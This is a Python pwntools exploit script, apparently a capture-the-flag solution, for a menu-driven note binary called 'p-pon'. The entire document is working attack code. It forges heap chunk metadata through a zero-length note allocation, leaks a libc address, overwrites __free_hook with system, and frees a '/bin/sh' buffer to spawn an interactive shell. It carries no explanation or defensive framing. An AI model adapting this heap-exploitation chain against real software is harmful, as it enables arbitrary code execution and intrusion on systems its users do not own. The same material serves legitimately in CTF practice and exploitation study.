#!/usr/bin/env python3

from pwn import *

exe = ELF('p-pon')
libc = ELF('./libc.so.6')
ld = ELF('./ld-ver.so')

context.binary = exe

args.LOCAL = 0
args.DEBUG = 0

diff = 7998


header = b'1. \xe3\x83\xa1\xe3\x83\xa2\xe3\x82\x92\xe8\xbf\xbd\xe5\x8a\xa0\n2. \xe3\x83\xa1\xe3\x83\xa2\xe3\x82\x92\xe5\x89\x8a\xe9\x99\xa4\n3. \xe3\x83\xa1\xe3\x83\xa2\xe3\x82\x92\xe8\xaa\xad\xe3\x82\x80'

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            p = gdb.debug([exe.path])
    else:
        p = remote("localhost", 7777)

    return p

def add(p: process, tlen, text):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"?\n", str(tlen).encode())
    p.sendlineafter("\n", text)

def delete(p: process, num):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(num).encode())

def readd(p: process, num):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(num).encode())
    return p.recvuntil(header)[:-len(header)]

def main():
    p = conn()
    add(p, 10, b"ponpon")
    add(p, 10, b"ponpon")
    delete(p, 0)
    add(p, 0, b"\x00" * 24 + p64(1057) + b"\x00" * 16 + p64(1) + p64(0x0000000000020d51) + b'\x00' * (1032-16) + p64(0x21) + b'\x00' * 24 + p64(0x21))
    delete(p, 1)
    add(p, 0, b"")
    libc = u64(readd(p, 1) + b"\x00\x00")
    free_hook = libc + diff
    sys = libc - 1682554
    print(hex(libc))
    p.sendlineafter(b"> ", b"4")
    delete(p, 1)
    delete(p, 0)
    input()
    add(p, 0, b"\x00" * 24 + p64(0x21) + p64(free_hook))
    add(p, 0, b"/bin/sh" + b"\x00" * (13))
    delete(p, 0)
    add(p, 0, b"/bin/sh" + b"\x00" * 17 + p64(0x21) + b"\x00" * 20)
    add(p, 0, p64(sys))
    delete(p, 0)

    #print(readd(p, 0))
    p.interactive()


if __name__ == "__main__":
    main()
